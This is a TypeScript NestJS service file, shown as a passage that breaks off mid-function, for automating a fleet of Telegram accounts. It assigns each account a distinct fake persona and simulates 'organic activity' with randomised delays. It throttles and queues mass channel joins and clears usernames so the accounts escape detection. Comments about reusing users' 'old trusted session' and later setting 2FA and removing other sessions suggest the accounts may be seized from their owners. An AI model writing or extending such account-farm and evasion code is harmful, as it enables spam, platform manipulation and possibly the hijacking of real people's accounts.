import { ChannelsService } from '../channels/channels.service';
import {
    BadRequestException,
    ConflictException,
    HttpException,
    Inject,
    Injectable,
    InternalServerErrorException,
    NotFoundException,
    forwardRef,
} from '@nestjs/common';
import { InjectModel } from '@nestjs/mongoose';
import { Model } from 'mongoose';
import { CreatePromoteClientDto } from './dto/create-promote-client.dto';
import {
    PromoteClient,
    PromoteClientDocument,
} from './schemas/promote-client.schema';
import { TelegramService } from '../Telegram/Telegram.service';
import { sleep } from 'telegram/Helpers';
import { Api } from 'telegram';
import { UsersService } from '../users/users.service';
import { ActiveChannelsService } from '../active-channels/active-channels.service';
import { ClientService } from '../clients/client.service';
import { UpdatePromoteClientDto } from './dto/update-promote-client.dto';
import { BufferClientService } from '../buffer-clients/buffer-client.service';
import { parseError } from '../../utils/parseError';
import { fetchWithTimeout } from '../../utils/fetchWithTimeout';
import { notifbot } from '../../utils/logbots';
import { connectionManager } from '../Telegram/utils/connection-manager';
import { SessionService } from '../session-manager';
import { channelInfo } from '../../utils/telegram-utils/channelinfo';
import { Client } from '../clients/schemas/client.schema';
import isPermanentError from '../../utils/isPermanentError';
import { PersonaPool, PersonaAssignment, generateCandidateCombinations, personaKey } from '../../utils/persona-assignment';
import { nameMatchesAssignment, lastNameMatches } from '../../utils/homoglyph-normalizer';
import { BotsService, ChannelCategory } from '../bots';
import {
    BaseClientUpdate,
    BaseClientService,
    ClientStatusType,
    ClientConfig,
    performOrganicActivity,
    WarmupPhase,
} from '../shared/base-client.service';
import { Channel } from '../channels/schemas/channel.schema';
import { ActiveChannel } from '../active-channels';
import { ClientHelperUtils } from '../shared/client-helper.utils';

@Injectable()
export class PromoteClientService extends BaseClientService<PromoteClientDocument> {

    private bufferClientService: BufferClientService;

    constructor(
        @InjectModel(PromoteClient.name)
        private promoteClientModel: Model<PromoteClientDocument>,
        @Inject(forwardRef(() => TelegramService))
        telegramService: TelegramService,
        @Inject(forwardRef(() => UsersService))
        usersService: UsersService,
        @Inject(forwardRef(() => ActiveChannelsService))
        activeChannelsService: ActiveChannelsService,
        @Inject(forwardRef(() => ClientService))
        clientService: ClientService,
        @Inject(forwardRef(() => ChannelsService))
        channelsService: ChannelsService,
        @Inject(forwardRef(() => BufferClientService))
        bufferClientServiceRef: BufferClientService,
        @Inject(forwardRef(() => SessionService))
        sessionService: SessionService,
        botsService: BotsService,
    ) {
        super(
            telegramService,
            usersService,
            activeChannelsService,
            clientService,
            channelsService,
            sessionService,
            botsService,
            PromoteClientService.name,
        );
        this.bufferClientService = bufferClientServiceRef;
    }

    // ---- Abstract implementations ----

    get model(): Model<PromoteClientDocument> {
        return this.promoteClientModel;
    }

    get clientType(): 'promote' {
        return 'promote';
    }

    get config(): ClientConfig {
        return {
            joinChannelInterval: 6 * 60 * 1000,       // Increased from 4min to 6min
            leaveChannelInterval: 60 * 1000,            // 1 minute
            leaveChannelBatchSize: 10,
            channelProcessingDelay: 120000,              // 120s (redesigned from 10s)
            channelTarget: 200,                          // Reduced from 350
            maxJoinsPerSession: 8,                       // NEW
            maxNewClientsPerTrigger: 10,
            minTotalClients: 12,
            maxMapSize: 100,
            cooldownHours: 2,                            // Fixed inconsistency (was 4h in outer check)
            clientProcessingDelay: 8000,                 // 8s between clients
            maxChannelJoinsPerDay: 20,
            joinsPerMobilePerRound: 3,
        };
    }

    // ---- Promote-specific: updateNameAndBio (uses firstName + petName) ----

    async updateNameAndBio(doc: PromoteClientDocument, client: Client, failedAttempts: number): Promise<number> {
        const telegramClient = await connectionManager.getClient(doc.mobile, { autoDisconnect: false, handler: false });
        try {
            await performOrganicActivity(telegramClient, 'medium');

            const me = await telegramClient.getMe();
            await sleep(ClientHelperUtils.gaussianRandom(7500, 1250, 5000, 10000));

            let updateCount = 0;

            if ((client.firstNames?.length > 0) || (client.promoteLastNames?.length > 0) || (client.bios?.length > 0) || (client.profilePics?.length > 0)) {
                // ── PERSONA BRANCH ──────────────────────────────────────────
                let assignment: Pick<PersonaAssignment, 'assignedFirstName' | 'assignedLastName' | 'assignedBio' | 'assignedProfilePics'> | null = null;

                // 1. Check if doc already has a valid assignment (any assigned field set AND pool version matches)
                const hasValidAssignment = (
                    doc.assignedFirstName != null ||
                    doc.assignedLastName != null ||
                    doc.assignedBio != null
                );

                if (hasValidAssignment) {
                    assignment = {
                        assignedFirstName: doc.assignedFirstName,
                        assignedLastName: doc.assignedLastName,
                        assignedBio: doc.assignedBio,
                        assignedProfilePics: doc.assignedProfilePics,
                    };
                } else {
                    // 2. Atomic assignment via findOneAndUpdate with guard
                    const pool: PersonaPool = {
                        firstNames: client.firstNames,
                        lastNames: client.promoteLastNames || [],
                        bios: client.bios || [],
                        profilePics: client.profilePics || [],
                        dbcoll: client.dbcoll,
                    };

                    // Query existing assignments for dedup (promote collection)
                    const existingAssignments: Array<{ mobile: string; assignedFirstName: string; assignedLastName?: string; assignedBio?: string; assignedProfilePics?: string[] }> = await this.model.find({
                        clientId: doc.clientId, status: 'active',
                        mobile: { $ne: doc.mobile },
                        $or: [
                            { assignedFirstName: { $ne: null } },
                            { assignedLastName: { $ne: null } },
                            { assignedBio: { $ne: null } },
                            { 'assignedProfilePics.0': { $exists: true } },
                        ],
                    }, { mobile: 1, assignedFirstName: 1, assignedLastName: 1, assignedBio: 1, assignedProfilePics: 1 }).lean();

                    // Cross-collection dedup: also fetch buffer assignments (best-effort)
                    try {
                        const bufferAssignments = await this.bufferClientService.model.find({
                            clientId: doc.clientId, status: 'active',
                            mobile: { $ne: doc.mobile },
                            $or: [
                                { assignedFirstName: { $ne: null } },
                                { assignedLastName: { $ne: null } },
                                { assignedBio: { $ne: null } },
                                { 'assignedProfilePics.0': { $exists: true } },
                            ],
                        }, { mobile: 1, assignedFirstName: 1, assignedLastName: 1, assignedBio: 1, assignedProfilePics: 1 }).lean();
                        existingAssignments.push(...bufferAssignments);
                    } catch { /* cross-collection dedup is best-effort */ }

                    const activeClientAssignment = await this.clientService.getActiveClientAssignment(client);
                    if (activeClientAssignment && activeClientAssignment.mobile !== doc.mobile && !existingAssignments.some(a => a.mobile === activeClientAssignment.mobile)) {
                        existingAssignments.push(activeClientAssignment);
                    }

                    const usedKeys = new Set(existingAssignments.map(a => personaKey({
                        firstName: a.assignedFirstName,
                        lastName: a.assignedLastName || '',
                        bio: a.assignedBio || '',
                        profilePics: a.assignedProfilePics || [],
                    })));

                    const candidates = generateCandidateCombinations(pool, doc.mobile);
                    const chosen = candidates.find(c => !usedKeys.has(personaKey(c)));

                    if (!chosen) {
                        this.logger.warn(`No unique persona candidate available for ${doc.mobile}, falling back to first candidate`);
                    }

                    const pick = chosen || candidates[0];
                    if (pick) {
                        const result = await this.model.findOneAndUpdate(
                            {
                                mobile: doc.mobile,
                                $or: [
                                    {
                                        assignedFirstName: null,
                                        assignedLastName: null,
                                        assignedBio: null,
                                        'assignedProfilePics.0': { $exists: false },
                                    },
                                ],
                            },
                            { $set: {
                                assignedFirstName: pick.firstName,
                                assignedLastName: pick.lastName || null,
                                assignedBio: pick.bio || null,
                                assignedProfilePics: pick.profilePics,
                            } },
                            { new: true },
                        );

                        if (result) {
                            assignment = {
                                assignedFirstName: result.assignedFirstName,
                                assignedLastName: result.assignedLastName,
                                assignedBio: result.assignedBio,
                                assignedProfilePics: result.assignedProfilePics,
                            };
                            this.logger.log(`Assigned persona "${pick.firstName}" to ${doc.mobile}`);
                        } else {
                            this.logger.warn(`Atomic persona assignment failed for ${doc.mobile} (guard condition not met)`);
                        }
                    }
                }

                // 3. Apply persona corrections if we have an assignment
                const hasAnyAssignment = assignment != null && (
                    assignment.assignedFirstName != null ||
                    assignment.assignedLastName != null ||
                    assignment.assignedBio != null
                );
                if (hasAnyAssignment) {
                    // Read current TG profile state once (needed for lastName and bio checks)
                    const fullUser = await telegramClient.client.invoke(new Api.users.GetFullUser({ id: new Api.InputUserSelf() }));
                    const currentLastName: string = (fullUser as any)?.users?.[0]?.lastName || '';
                    const currentBio: string = (fullUser as any)?.fullUser?.about || '';

                    // Check firstName mismatch
                    const firstNameWrong = assignment?.assignedFirstName != null
                        && !nameMatchesAssignment(me.firstName || '', assignment.assignedFirstName);
                    // Check lastName mismatch (only when assignedLastName is non-null)
                    const lastNameWrong = assignment?.assignedLastName != null
                        && !lastNameMatches(currentLastName, assignment.assignedLastName);

                    if (firstNameWrong || lastNameWrong) {
                        const displayFirstName = assignment.assignedFirstName || me.firstName || '';
                        const displayLastName = assignment.assignedLastName || '';
                        this.logger.log(`Updating persona name/lastName for ${doc.mobile}`);
                        await performOrganicActivity(telegramClient, 'medium');
                        await telegramClient.client.invoke(new Api.account.UpdateProfile({
                            firstName: displayFirstName,
                            lastName: displayLastName,
                        }));
                        updateCount++;
                        await sleep(ClientHelperUtils.gaussianRandom(5000, 1000, 3000, 7000));
                    }

                    // Check and update bio if assignedBio is non-null and mismatches
                    if (assignment.assignedBio != null && currentBio !== assignment.assignedBio) {
                        this.logger.log(`Updating persona bio for ${doc.mobile}`);
                        await performOrganicActivity(telegramClient, 'light');
                        await sleep(ClientHelperUtils.gaussianRandom(12500, 3000, 8000, 18000));
                        await telegramClient.client.invoke(new Api.account.UpdateProfile({ about: assignment.assignedBio }));
                        updateCount++;
                    }
                }
            } else {
                this.logger.debug(`Skipping identity update for ${doc.mobile}: no persona assignment available yet`);
            }

            await this.update(doc.mobile, {
                ...(updateCount > 0 ? { nameBioUpdatedAt: new Date() } : {}),
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: 0,
                lastUpdateFailure: null,
                organicActivityAt: new Date(),
            });
            this.logger.debug(`Updated name and bio for ${doc.mobile}`);
            await sleep(ClientHelperUtils.gaussianRandom(40000, 5000, 30000, 50000));
            return updateCount;
        } catch (error: unknown) {
            const errorDetails = this.handleError(error, 'Error updating profile', doc.mobile);
            await this.update(doc.mobile, {
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: failedAttempts + 1,
                lastUpdateFailure: new Date(),
            });
            if (isPermanentError(errorDetails)) {
                const reason = await this.buildPermanentAccountReason(errorDetails.message, telegramClient);
                await this.markAsInactive(doc.mobile, reason);
            }
            return 0;
        } finally {
            await this.safeUnregisterClient(doc.mobile);
        }
    }

    // ---- Promote-specific: updateUsername (clears username) ----

    async updateUsername(doc: PromoteClientDocument, client: Client, failedAttempts: number): Promise<number> {
        const telegramClient = await connectionManager.getClient(doc.mobile, { autoDisconnect: false, handler: false });
        try {
            await performOrganicActivity(telegramClient, 'light');

            await this.telegramService.updateUsername(doc.mobile, '');
            await this.update(doc.mobile, {
                usernameUpdatedAt: new Date(),
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: 0,
                lastUpdateFailure: null,
                organicActivityAt: new Date(),
            });
            this.logger.debug(`Cleared username for ${doc.mobile}`);
            await sleep(ClientHelperUtils.gaussianRandom(40000, 5000, 30000, 50000));
            return 1;
        } catch (error: unknown) {
            const errorDetails = this.handleError(error, 'Error updating username', doc.mobile);
            await this.update(doc.mobile, {
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: failedAttempts + 1,
                lastUpdateFailure: new Date(),
            });
            if (isPermanentError(errorDetails)) {
                const reason = await this.buildPermanentAccountReason(errorDetails.message, telegramClient);
                await this.markAsInactive(doc.mobile, reason);
            }
            return 0;
        } finally {
            await this.safeUnregisterClient(doc.mobile);
        }
    }

    // ---- CRUD (promote-specific) ----

    async create(promoteClient: CreatePromoteClientDto): Promise<PromoteClient> {
        const promoteClientData = {
            ...promoteClient,
            status: promoteClient.status || 'active',
            message: promoteClient.message || 'Account is functioning properly',
        };
        const newUser = new this.promoteClientModel(promoteClientData);
        const result = await newUser.save();
        await this.botsService.sendMessageByCategory(
            ChannelCategory.ACCOUNT_NOTIFICATIONS,
            [
                'Promote Client Created',
                '',
                `Mobile: ${promoteClient.mobile}`,
                `ClientId: ${promoteClient.clientId || '-'}`,
                `Status: ${result.status}`,
                `AvailableDate: ${promoteClient.availableDate || '-'}`,
                `Channels: ${promoteClient.channels ?? '-'}`,
                `Message: ${promoteClient.message || '-'}`,
            ].join('\n'),
        );
        return result;
    }

    async findAll(statusFilter?: ClientStatusType): Promise<PromoteClient[]> {
        const filter = statusFilter ? { status: statusFilter } : {};
        return this.promoteClientModel.find(filter).exec();
    }

    async findOne(mobile: string, throwErr: boolean = true): Promise<PromoteClientDocument> {
        const user = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();
        if (!user && throwErr) {
            throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);
        }
        return user as PromoteClientDocument;
    }

    async update(mobile: string, updateClientDto: BaseClientUpdate): Promise<PromoteClientDocument> {
        const updatedUser = await this.promoteClientModel
            .findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, returnDocument: 'after' })
            .exec();
        if (!updatedUser) {
            throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);
        }
        return updatedUser;
    }

    async updateStatus(mobile: string, status: ClientStatusType, message?: string): Promise<PromoteClientDocument> {
        const updateData: UpdatePromoteClientDto = { status };
        if (message) updateData.message = message;
        await this.botsService.sendMessageByCategory(ChannelCategory.ACCOUNT_NOTIFICATIONS, `Promote Client:\n\nStatus Updated to ${status}\nMobile: ${mobile}\nReason: ${message || ''}`);
        return this.update(mobile, updateData);
    }

    async refillJoinQueue(clientId?: string | null): Promise<number> {
        if (this.isJoinChannelProcessing || this.isLeaveChannelProcessing) return 0;
        if (this.telegramService.hasActiveClientSetup()) return 0;

        this.resetDailyJoinCountersIfNeeded();

        const query: Record<string, any> = {
            status: 'active',
            channels: { $lt: this.config.channelTarget },
            mobile: { $nin: Array.from(this.joinChannelMap.keys()) },
        };
        if (clientId) query.clientId = clientId;

        const eligible = await this.promoteClientModel
            .find(query)
            .sort({ channels: 1 })
            .limit(this.config.maxMapSize)
            .exec();

        let added = 0;
        let leaveAdded = 0;
        for (const doc of eligible) {
            if (this.isMobileDailyCapped(doc.mobile)) continue;
            try {
                const client = await connectionManager.getClient(doc.mobile, { autoDisconnect: false, handler: false });
                const channels = await channelInfo(client.client, true);
                await this.update(doc.mobile, { channels: channels.ids.length });

                if (channels.canSendFalseCount < 10) {
                    const remaining = this.config.maxChannelJoinsPerDay - this.getDailyJoinCount(doc.mobile);
                    const channelsToJoin = await this.fetchJoinableChannels(channels.ids.length, remaining, channels.ids);
                    if (channelsToJoin.length === 0) continue;

                    if (this.safeSetJoinChannelMap(doc.mobile, channelsToJoin)) {
                        added++;
                    }
                } else if (!this.leaveChannelMap.has(doc.mobile)) {
                    if (this.safeSetLeaveChannelMap(doc.mobile, channels.canSendFalseChats)) {
                        leaveAdded++;
                    }
                }
            } catch (error) {
                const errorDetails = parseError(error, `RefillJoinQueueErr: ${doc.mobile}`);
                if (isPermanentError(errorDetails)) {
                    const reason = await this.buildPermanentAccountReason(errorDetails.message);
                    await this.markAsInactive(doc.mobile, reason);
                }
            } finally {
                await this.safeUnregisterClient(doc.mobile);
            }
        }

        if (added > 0) {
            this.logger.log(`Refilled join queue with ${added} promote clients`);
        }
        if (leaveAdded > 0 && !this.leaveChannelIntervalId) {
            this.createTimeout(() => this.leaveChannelQueue(), 5000 + Math.random() * 3000);
        }

        return added;
    }

    private async fetchJoinableChannels(currentChannels: number, limit: number, excludedIds: string[]): Promise<(Channel | ActiveChannel)[]> {
        const capped = Math.min(limit, 25);
        if (capped <= 0) return [];
        return currentChannels < 220
            ? this.activeChannelsService.getActiveChannels(capped, 0, excludedIds)
            : this.channelsService.getActiveChannels(capped, 0, excludedIds);
    }

    async updateLastUsed(mobile: string): Promise<PromoteClient> {
        return this.update(mobile, { lastUsed: new Date() });
    }

    async markAsInactive(mobile: string, reason: string): Promise<PromoteClientDocument | null> {
        this.logger.log(`Marking promote client ${mobile} as inactive: ${reason}`);
        try {
            return await this.updateStatus(mobile, 'inactive', reason);
        } catch (error) {
            const errorMessage = error instanceof Error ? error.message : 'Unknown error';
            this.logger.error(`Failed to mark promote client ${mobile} as inactive: ${errorMessage}`);
            return null;
        }
    }

    async markAsActive(mobile: string, message: string = 'Account is functioning properly'): Promise<PromoteClient> {
        return this.updateStatus(mobile, 'active', message);
    }

    async createOrUpdate(mobile: string, createOrUpdateUserDto: CreatePromoteClientDto | UpdatePromoteClientDto): Promise<PromoteClient> {
        const existingUser = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();
        if (existingUser) {
            return this.update(existingUser.mobile, createOrUpdateUserDto as UpdatePromoteClientDto);
        } else {
            return this.create(createOrUpdateUserDto as CreatePromoteClientDto);
        }
    }

    async remove(mobile: string, message?: string): Promise<void> {
        try {
            const deleteResult = await this.promoteClientModel.deleteOne({ mobile }).exec();
            if (deleteResult.deletedCount === 0) {
                throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);
            }
            await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`${process.env.serviceName || process.env.clientId} Deleting Promote Client : ${mobile}\n${message}`)}`);
        } catch (error) {
            if (error instanceof NotFoundException) throw error;
            const errorDetails = parseError(error);
            throw new HttpException(errorDetails.message, errorDetails.status);
        }
    }

    async search(filter: Partial<PromoteClient>): Promise<PromoteClient[]> {
        return this.promoteClientModel.find(filter).exec();
    }

    async executeQuery(query: Record<string, any>, sort?: Record<string, any>, limit?: number, skip?: number): Promise<PromoteClientDocument[]> {
        if (!query) throw new BadRequestException('Query is invalid.');
        try {
            const queryExec = this.promoteClientModel.find(query);
            if (sort) queryExec.sort(sort);
            if (limit) queryExec.limit(limit);
            if (skip) queryExec.skip(skip);
            return await queryExec.exec();
        } catch (error) {
            if (error instanceof BadRequestException || error instanceof NotFoundException) throw error;
            const errorMessage = error instanceof Error ? error.message : 'Unknown error occurred';
            throw new InternalServerErrorException(`Query execution failed: ${errorMessage}`);
        }
    }

    // ---- Promote-specific: Enrollment (redesigned — no 2FA, no removeOtherAuths, no profile changes) ----

    async setAsPromoteClient(
        mobile: string,
        clientId?: string,
        availableDate: string = ClientHelperUtils.getTodayDateString(),
    ) {
        const user = (await this.usersService.search({ mobile, expired: false }))[0];
        if (!user) throw new BadRequestException('User not found');

        const isExist = await this.findOne(mobile, false);
        if (isExist) throw new ConflictException('PromoteClient already exists');

        const clients = await this.clientService.findAll();
        const clientMobiles = clients.map((client) => client?.mobile);
        if (clientMobiles.includes(mobile)) throw new BadRequestException('Number is an Active Client');

        // Auto-assign clientId if not provided — pick the client with fewest promote clients
        let targetClientId = clientId;
        if (!targetClientId && clients.length > 0) {
            const counts = await this.promoteClientModel.aggregate([
                { $match: { clientId: { $exists: true, $ne: null }, status: 'active' } },
                { $group: { _id: '$clientId', count: { $sum: 1 } } },
            ]);
            const countMap = new Map(counts.map((c: any) => [c._id, c.count]));
            let minCount = Infinity;
            for (const c of clients) {
                const count = countMap.get(c.clientId) || 0;
                if (count < minCount) {
                    minCount = count;
                    targetClientId = c.clientId;
                }
            }
        }

        const telegramClient = await connectionManager.getClient(mobile, { autoDisconnect: false });
        try {
            // Only get channel info — no 2FA, no profile changes, no new session
            const channels = await this.telegramService.getChannelInfo(mobile, true);

            const promoteClient = {
                tgId: user.tgId,
                lastActive: 'default',
                mobile: user.mobile,
                session: user.session, // Use old trusted session
                availableDate,
                channels: channels.ids.length,
                clientId: targetClientId,
                status: 'active',
                message: 'Enrolled for warmup',
                lastUsed: null,
            };

            await this.promoteClientModel
                .findOneAndUpdate(
                    { mobile: user.mobile },
                    {
                        $set: {
                            ...promoteClient,
                            warmupPhase: WarmupPhase.ENROLLED,
                            warmupJitter: ClientHelperUtils.generateWarmupJitter(),
                            enrolledAt: new Date(),
                        }
                    },
                    { new: true, upsert: true },
                )
                .exec();
        } catch (error) {
            const errorDetails = parseError(error);
            // Retire permanently dead accounts at the source
            if (isPermanentError(errorDetails)) {
                try { await this.usersService.update(user.tgId, { expired: true }); } catch { }
            }
            throw new HttpException(errorDetails.message, errorDetails.status);
        } finally {
            await this.safeUnregisterClient(mobile);
        }
        return 'Client enrolled as promote successfully';
    }

    // ---- Promote-specific: updateInfo ----

    async updateInfo() {
        const clients = await this.promoteClientModel
            .find({ status: 'active', lastChecked: { $lt: new Date(Date.now() - 5 * this.ONE_DAY_MS) } })
            .sort({ channels: 1 })
            .limit(25);

        const now = Date.now();
        for (let i = 0; i < clients.length; i++) {
            const client = clients[i];
            const lastChecked = client.lastChecked ? new Date(client.lastChecked).getTime() : 0;
            await this.performHealthCheck(client.mobile, lastChecked, now);
            if (i < clients.length - 1) {
                await sleep(ClientHelperUtils.gaussianRandom(16000, 2500, 12000, 20000));
            }
        }
    }

    // ---- Promote-specific: Channel joining entry point ----

    async joinchannelForPromoteClients(skipExisting: boolean = true): Promise<string> {
        if (this.telegramService.hasActiveClientSetup()) {
            return 'Active client setup exists, skipping promotion';
        }

        this.logger.log('Starting join channel process');

        // Don't destroy in-flight joins — skip if still processing
        if (this.isJoinChannelProcessing || this.isLeaveChannelProcessing) {
            this.logger.warn('Join/leave processing still in progress, skipping re-entry');
            return 'Join/leave still processing, skipped';
        }

        const preservedMobiles = await this.prepareJoinChannelRefresh(skipExisting);

        try {
            const clients = await this.promoteClientModel
                .find({
                    channels: { $lt: this.config.channelTarget },
                    mobile: { $nin: Array.from(preservedMobiles) },
                    status: 'active',
                })
                .sort({ channels: 1 })
                .limit(this.config.maxMapSize);

            const joinSet = new Set<string>();
            const leaveSet = new Set<string>();
            let successCount = 0;
            let failCount = 0;

            for (const document of clients) {
                const mobile = document.mobile;
                try {
                    const client = await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });

                    await sleep(5000 + Math.random() * 3000);
                    const channels = await channelInfo(client.client, true);
                    await sleep(5000 + Math.random() * 3000);
                    await this.update(mobile, { channels: channels.ids.length });

                    if (channels.canSendFalseCount < 10) {
                        const excludedIds = channels.ids;
                        await sleep(5000 + Math.random() * 3000);
                        const isBelowThreshold = channels.ids.length < 220;

                        const result = isBelowThreshold
                            ? await this.activeChannelsService.getActiveChannels(25, 0, excludedIds) // Reduced from 150
                            : await this.channelsService.getActiveChannels(25, 0, excludedIds);

                        if (!this.joinChannelMap.has(mobile)) {
                            if (this.safeSetJoinChannelMap(mobile, result)) {
                                joinSet.add(mobile);
                            }
                        }
                        // No session creation during warmup — use existing old session
                    } else {
                        if (!this.leaveChannelMap.has(mobile)) {
                            if (this.safeSetLeaveChannelMap(mobile, channels.canSendFalseChats)) {
                                leaveSet.add(mobile);
                            }
                        }
                    }

                    successCount++;
                } catch (error) {
                    failCount++;
                    const errorDetails = parseError(error);
                    if (isPermanentError(errorDetails)) {
                        await sleep(1000);
                        const reason = await this.buildPermanentAccountReason(errorDetails.message);
                        await this.markAsInactive(mobile, reason);
                    }
                } finally {
                    await this.safeUnregisterClient(mobile);
                    await sleep(this.config.clientProcessingDelay + Math.random() * 5000);
                }
            }

            await sleep(6000 + Math.random() * 3000);

            if (joinSet.size > 0) {
                this.createTimeout(() => this.joinChannelQueue(), 2000);
            }
            if (leaveSet.size > 0) {
                this.createTimeout(() => this.leaveChannelQueue(), 5000);
            }

            return `Initiated Joining channels for ${joinSet.size} | Queued for leave: ${leaveSet.size}`;
        } catch (error) {
            this.logger.error('Unexpected error during joinchannelForPromoteClients:', error);
            this.joinChannelMap.clear();
            this.leaveChannelMap.clear();
            this.clearJoinChannelInterval();
            this.clearLeaveChannelInterval();
            throw new Error('Failed to initiate channel joining process');
        }
    }

    // ---- Promote-specific: Check & process promote clients ----

    async checkPromoteClients() {
        if (this.telegramService.hasActiveClientSetup()) {
            this.logger.warn('Ignored active check promote channels as active client setup exists');
            return;
        }

        const clients = await this.clientService.findAll();
        const bufferClients = await this.bufferClientService.findAll();
        const clientMap = new Map(clients.map((client) => [client.clientId, client]));
        const now = Date.now();

        await this.selfHealLegacyOperationalState();

        const clientMainMobiles = clients.map((c) => c.mobile);
        const bufferClientIds = bufferClients.map((c) => c.mobile);
        const assignedPromoteClients = await this.promoteClientModel
            .find({ clientId: { $exists: true, $ne: null }, status: 'active' })
            .exec();
        const assignedPromoteMobiles = assignedPromoteClients.map((doc) => doc.mobile);

        const goodIds = [...clientMainMobiles, ...bufferClientIds, ...assignedPromoteMobiles].filter(Boolean);

        const promoteClientsPerClient = new Map<string, number>(
            assignedPromoteClients
                .filter((doc) => !!doc.clientId)
                .reduce((acc, doc) => {
                    acc.set(doc.clientId, (acc.get(doc.clientId) || 0) + 1);
                    return acc;
                }, new Map<string, number>()),
        );

        let totalUpdates = 0;
        const updatedEntries: string[] = [];
        const promoteClientsToProcess: Array<{
            promoteClient: PromoteClientDocument;
            client: Client;
            clientId: string;
            priority: number;
        }> = [];

        for (const promoteClient of assignedPromoteClients) {
            if (!promoteClient.clientId) continue;
            const client = clientMap.get(promoteClient.clientId);
            if (!client) continue;
            if (promoteClient.inUse === true) continue;

            const lastUpdateAttempt = promoteClient.lastUpdateAttempt ? new Date(promoteClient.lastUpdateAttempt).getTime() : 0;
            if (this.isOnCooldown(promoteClient.mobile, promoteClient.lastUpdateAttempt, now)) continue;

            const hasBeenUsed = promoteClient.lastUsed && new Date(promoteClient.lastUsed).getTime() > 0;
            if (hasBeenUsed) {
                await this.backfillTimestamps(promoteClient.mobile, promoteClient as PromoteClientDocument, now);
                continue;
            }

            const warmupPhase = promoteClient.warmupPhase || WarmupPhase.ENROLLED;
            const failedAttempts = promoteClient.failedUpdateAttempts || 0;
            const lastAttemptAgeHours = lastUpdateAttempt > 0
                ? (now - lastUpdateAttempt) / (60 * 60 * 1000)
                : 10000;
            const warmupBoost = warmupPhase !== WarmupPhase.READY && warmupPhase !== WarmupPhase.SESSION_ROTATED ? 5000 : 0;
            const priority = warmupBoost + lastAttemptAgeHours - (failedAttempts * 100);

            promoteClientsToProcess.push({ promoteClient: promoteClient as PromoteClientDocument, client, clientId: promoteClient.clientId, priority });
        }

        promoteClientsToProcess.sort((a, b) => b.priority - a.priority);

        for (const { promoteClient, client } of promoteClientsToProcess) {
            if (totalUpdates >= this.MAX_UPDATES_PER_CYCLE) break;
            const warmupPhase = promoteClient.warmupPhase || WarmupPhase.ENROLLED;
            if (warmupPhase === WarmupPhase.READY || warmupPhase === WarmupPhase.SESSION_ROTATED) {
                const lastChecked = promoteClient.lastChecked ? new Date(promoteClient.lastChecked).getTime() : 0;
                const healthCheckPassed = await this.performHealthCheck(promoteClient.mobile, lastChecked, now);
                if (!healthCheckPassed) continue;
            }
            const processResult = await this.processClient(promoteClient, client);
            if (processResult.updateCount > 0) {
                totalUpdates += processResult.updateCount;
                updatedEntries.push(
                    `${client.clientId} | ${promoteClient.mobile} | ${processResult.updateSummary || 'updated'} | count=${processResult.updateCount}`,
                );
            }
        }

        // Dynamic availability: add new promote clients if needed
        const clientNeedingPromoteClients: Array<{
            clientId: string;
            totalNeeded: number;
            windowNeeds: Array<{ window: string; available: number; needed: number; targetDate: string; minRequired: number }>;
            totalActive: number;
            totalNeededForCount: number;
            calculationReason: string;
            priority: number;
        }> = [];

        for (const client of clients) {
            const availabilityNeeds = await this.calculateAvailabilityBasedNeedsForCurrentState(client.clientId);
            if (availabilityNeeds.totalNeeded > 0) {
                clientNeedingPromoteClients.push({ clientId: client.clientId, ...availabilityNeeds });
            }
        }

        clientNeedingPromoteClients.sort((a, b) => a.priority - b.priority);

        let totalSlotsNeeded = 0;
        for (const clientNeed of clientNeedingPromoteClients) {
            const allocated = Math.min(clientNeed.totalNeeded, this.config.maxNewClientsPerTrigger - totalSlotsNeeded);
            if (allocated > 0) totalSlotsNeeded += allocated;
            if (totalSlotsNeeded >= this.config.maxNewClientsPerTrigger) break;
        }

        let dynamicCreateResult: { createdCount: number; attemptedCount: number; createdEntries: string[] } = {
            createdCount: 0,
            attemptedCount: 0,
            createdEntries: [],
        };
        if (clientNeedingPromoteClients.length > 0 && totalSlotsNeeded > 0) {
            dynamicCreateResult = await this.addNewUserstoPromoteClientsDynamic([], goodIds, clientNeedingPromoteClients, promoteClientsPerClient);
        }

        await this.sendPromoteCheckSummaryNotification(
            totalUpdates,
            dynamicCreateResult.createdCount,
            dynamicCreateResult.attemptedCount,
            updatedEntries,
            dynamicCreateResult.createdEntries,
        );
    }

    // ---- Promote-specific: Create promote client from user (redesigned) ----

    private async createPromoteClientFromUser(
        document: { mobile: string; tgId: string },
        targetClientId: string,
        availableDate?: string
    ): Promise<boolean> {
        const telegramClient = await connectionManager.getClient(document.mobile, { autoDisconnect: false });

        try {
            const hasPassword = await telegramClient.hasPassword();
            if (hasPassword) {
                await this.updateUser2FAStatus(document.tgId, document.mobile);
                return false;
            }

            // No removeOtherAuths, no set2fa — just get channel info and enroll
            const channels = await channelInfo(telegramClient.client, true);
            await sleep(ClientHelperUtils.gaussianRandom(7500, 1250, 5000, 10000));

            const user = (await this.usersService.search({ mobile: document.mobile }))[0];
            const targetAvailableDate = availableDate || ClientHelperUtils.getTodayDateString();

            const promoteClient: CreatePromoteClientDto = {
                tgId: document.tgId,
                lastActive: 'today',
                mobile: document.mobile,
                session: user?.session || '', // Use old trusted session
                availableDate: targetAvailableDate,
                channels: channels.ids.length,
                clientId: targetClientId,
                status: 'active',
                message: 'Enrolled for warmup',
                lastUsed: null,
            };

            await this.promoteClientModel.findOneAndUpdate(
                { mobile: document.mobile },
                {
                    $set: {
                        ...promoteClient,
                        warmupPhase: WarmupPhase.ENROLLED,
                        warmupJitter: ClientHelperUtils.generateWarmupJitter(),
                        enrolledAt: new Date(),
                    }
                },
                { new: true, upsert: true }
            ).exec();

            // Do NOT mark user as 2FA-enabled here — 2FA is set later during settling phase
            this.logger.log(`Created PromoteClient for ${targetClientId} with availability ${targetAvailableDate}`);
            await this.botsService.sendMessageByCategory(
                ChannelCategory.ACCOUNT_NOTIFICATIONS,
                [
                    'Promote Client Enrolled',
                    '',
